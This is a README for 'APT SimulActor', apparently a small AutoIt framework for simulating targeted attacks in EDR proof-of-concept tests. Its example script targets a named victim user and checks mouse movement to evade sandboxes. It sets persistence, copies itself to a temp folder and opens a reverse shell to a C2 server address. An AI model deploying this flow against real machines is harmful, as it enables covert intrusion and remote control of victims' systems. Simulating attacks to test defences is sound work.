# APT SimulActor

## Introduction

Targeted attacks are not random in nature and are usually composed of different phases like infection, data exfiltration and persistency.
APT SimulActor is a little framework based on AutoIT libraries for basic EDR POCs.


## Example Flow

![flow](https://user-images.githubusercontent.com/24607076/70719514-0af56200-1cea-11ea-8167-4bbe872d525c.PNG)


## Example Code
```
#include "libs/settings.au3"
#include "libs/network.au3"
#include "libs/info.au3"
#include "libs/files.au3"
#include "libs/misc.au3"

$victim = "john"
$c2server = "192.168.0.1"
$c2port = "432"

if isRunningFromTemp() Then

   SetPersistent4CurrentUser()

   ReverseShell($c2server, $c2port)

Else

   if AmIusername($victim) Then

	  if InternetCheck() Then

		 if DetectMouseMoving() Then

			MessageBox("Debug","Hi!")

			CopyTempRun()

		 EndIf

	  EndIf

   EndIf

EndIf
```



## Prerequisites

AutoIt Downloads [link](https://www.autoitscript.com/site/autoit/downloads/)

